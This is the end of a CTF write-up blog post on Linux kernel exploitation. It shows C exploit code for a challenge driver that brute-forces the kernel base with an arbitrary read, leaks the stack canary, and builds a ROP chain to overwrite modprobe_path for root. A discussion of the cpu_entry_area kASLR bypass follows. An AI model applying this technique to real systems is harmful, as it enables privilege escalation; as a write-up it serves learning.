</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;/tmp/pwn&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>system</span><span class=p>(</span><span class=s2>&#34;cat /flag.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsigned</span> <span class=n>long</span> <span class=n>user_rip</span> <span class=o>=</span> <span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span><span class=p>)</span><span class=n>win</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>perror</span><span class=p>(</span><span class=n>const</span> <span class=n>char</span><span class=o>*</span> <span class=n>msg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>puts</span><span class=p>(</span><span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsigned</span> <span class=n>long</span> <span class=n>aar</span><span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span> <span class=n>ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>unsigned</span> <span class=n>long</span> <span class=n>leak</span><span class=p>[</span><span class=mi>264</span><span class=o>/</span><span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>        <span class=n>leak</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mh>0x1337</span><span class=p>,</span> <span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>leak</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>unsigned</span> <span class=n>long</span> <span class=n>kbase</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=n>new_path</span><span class=p>[]</span> <span class=o>=</span> <span class=s2>&#34;/tmp/xpl.sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>save_state</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/dev/window&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>perror</span><span class=p>(</span><span class=s2>&#34;error: unable to open /dev/window&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>kbase</span> <span class=o>=</span> <span class=mh>0xffffffff80000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>unsigned</span> <span class=n>long</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>aar</span><span class=p>(</span><span class=n>kbase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;[-] trying 0x</span><span class=si>%lx</span><span class=s2>... got 0x</span><span class=si>%lx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>kbase</span><span class=p>,</span> <span class=n>ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>ret</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>kbase</span> <span class=o>+=</span> <span class=mh>0x100000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>unsigned</span> <span class=n>long</span> <span class=n>canary</span> <span class=o>=</span> <span class=n>aar</span><span class=p>(</span><span class=n>aar</span><span class=p>(</span><span class=n>kbase</span><span class=o>+</span><span class=mh>0x2744050</span><span class=p>)</span><span class=o>-</span><span class=mh>0x6db898</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;[*] kbase at 0x</span><span class=si>%lx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>kbase</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;[*] canary at 0x</span><span class=si>%lx</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>canary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=n>payload</span><span class=p>[</span><span class=mh>0x1000</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>unsigned</span> <span class=n>long</span><span class=o>*</span> <span class=n>krop</span> <span class=o>=</span> <span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>payload</span><span class=p>[</span><span class=mh>0x40</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=n>fixup</span> <span class=n>canary</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=n>copy_from_user</span><span class=p>(</span><span class=n>modprobe_path</span><span class=p>,</span> <span class=n>xpl_sh</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>xpl_sh</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rdi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>modprobe_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rsi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=p>(</span><span class=n>unsigned</span> <span class=n>long</span><span class=p>)</span><span class=n>new_path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>pop_rdx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>new_path</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>copy_from_user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>//</span> <span class=k>return</span> <span class=n>gracious</span> <span class=n>to</span> <span class=n>user</span><span class=o>-</span><span class=n>mode</span> <span class=o>-&gt;</span> <span class=n>win</span> <span class=n>function</span> 
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>swapgs_iret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>user_rip</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>user_cs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>user_rflags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>user_sp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=o>*</span><span class=n>krop</span><span class=o>++</span> <span class=o>=</span> <span class=n>user_ss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=p>(</span><span class=n>char</span><span class=o>*</span><span class=p>)</span><span class=n>krop</span> <span class=o>-</span> <span class=n>payload</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h2 id=extra-lore-----kaslr-bypass-via-cpu_entry_area>Extra lore &mdash; kASLR bypass via cpu_entry_area</h2><p>After the CTF, I was looking through the writeups from other participants and I chanced upon an interesting exploit by a <a href=https://nasm.re/>nasm</a> <em>(huge kudos to him for his awesome poc)</em>. That prompted me to do some research.</p><p><em>reference: <a href=https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt>mm.txt</a></em></p><pre tabindex=0><code>_________________________________________________________________________________________________________________________
                  |            |                  |         |
 fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole
                  |            |                  |         | vaddr_end for KASLR
 fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping
 fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole
 ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks
 ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole
 ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space
 ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole
 ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0
 ffffffff80000000 |-2048    MB |                  |         |
 ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space
 ffffffffff000000 |  -16    MB |                  |         |
    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset
 ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI
 ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole
__________________|____________|__________________|_________|___________________________________________________________
</code></pre><p><em>extract from <a href=https://lore.kernel.org/lkml/166639114548.401.707105259028399157.tip-bot2@tip-bot2/T/>linux kernel lore</a></em></p><blockquote><p>Seth found that the CPU-entry-area; the piece of per-cpu data that is
mapped into the userspace page-tables for kPTI is not subject to any
randomization &ndash; irrespective of kASLR settings.</p></blockquote><p>Surprisingly, for the longest of time, <code>cpu_entry_area</code> mapping in the kernel memory space has not been subjected to kASLR.</p><p><em>extract from <a href=https://lore.kernel.org/lkml/20221213174234.688534-1-dave.hansen@linux.intel.com/>lkml</a></em></p><blockquote><p>Without it, these areas are a tasty target for attackers. The entry code and mappings are especially tricky code and this has caused some issues along the way, but they have settled down.</p></blockquote><p>This is a very powerful attack vector, since leaking the kernel base and bypassing kASLR would now be trivial with any single arbitrary read primitive.</p><p>Understandably so, earlier this year, there has been a few updates to the linux kernel to randomize <code>cpu_entry_area</code> and destroy this easy <em>kASLR bypass</em>.</p><p>However this led me to still be curious &mdash; how long has <code>cpu_entry_area</code> been unaffected by kASLR, considering that it was only patched recently?</p><p>The earliest <a href=https://lkml.org/lkml/2017/12/4/881>article</a> I found that mentioned about this dated back to 2017. I found it really interesting how this took 6 years to realize and patch. That was some really cool linux kernel lore!</p><h2 id=conclusion>Conclusion</h2><p>I hope that this writeup was insightful and easy to follow, if there are any queries, feel free to reach out to me on discord via <strong>@caprinux</strong>. If you are interested in learning more about kernel pwn, you can follow some of the awesome blogs here</p><ul><li><a href=https://github.com/smallkirby/kernelpwn>https://github.com/smallkirby/kernelpwn</a></li><li><a href=https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/>https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></li><li><a href=https://pawnyable.cafe/linux-kernel/>https://pawnyable.cafe/linux-kernel/</a></li></ul><p>Also, lots of respect for <a href=https://nasm.re/>nasm</a> for inspiring the last section of this writeup. You can find his full writeup for the challenge <a href=https://ctftime.org/writeup/37670>here</a>.</p></div></article><hr style=margin-top:40px;margin-bottom:40px><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//caprinux.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/caprinux target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://x.com/elma_ios target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 elma.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg></a><script src=https://blog.caprinux.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>